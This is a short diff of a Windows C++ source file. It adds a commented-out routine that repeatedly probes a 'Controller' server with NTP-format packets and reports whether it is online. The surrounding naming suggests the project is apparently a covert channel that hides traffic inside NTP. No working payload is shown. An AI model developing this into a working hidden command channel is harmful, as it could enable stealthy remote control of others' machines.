@@ -1,5 +1,5 @@
 #define NOMINMAX
-
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <vector>
 #include <iostream>
 //std::vector<uint8_t> placeholderNtpPacket = {
@@ -25,6 +25,43 @@
 #include <algorithm>
 
 #pragma comment(lib, "Ws2_32.lib")
+
+//right nwo doesn't work due to a socket_error throwing an exception, as of course it does cuz the server can't respond. Problem for later/a feature later
+//void waitForControllerToComeOnline() {
+//	std::vector<uint8_t> packetData = {};
+//
+//	while (true) {
+//		try {
+//			NTPPacket normalNtpPacketClass;
+//			std::vector<uint8_t> normalNtpPacket = normalNtpPacketClass.getPacket();
+//
+//			if (normalNtpPacket.size() == 48) {
+//				std::cout << "[+] Controller Online at " << Controller::serverAddress
+//					<< ":" << Controller::port << std::endl;
+//				return;
+//			}
+//			else {
+//				std::cout << "[+] Controller Offline at " << Controller::serverAddress
+//					<< ":" << Controller::port << std::endl;
+//			}
+//
+//			// Optional: you could also probe the server by sending a small UDP packet here
+//			// sendChunk(normalNtpPacket);
+//
+//		}
+//		catch (const std::exception& ex) {
+//			std::cerr << "[!] Socket or packet exception: " << ex.what()
+//				<< " — retrying in 5s..." << std::endl;
+//		}
+//		catch (...) {
+//			std::cerr << "[!] Unknown exception while checking controller — retrying in 5s..."
+//				<< std::endl;
+//		}
+//
+//		Sleep(5000); // wait before retrying
+//	}
+//}
+
 
 std::vector<uint8_t> sendChunk(
     std::vector <uint8_t> packet
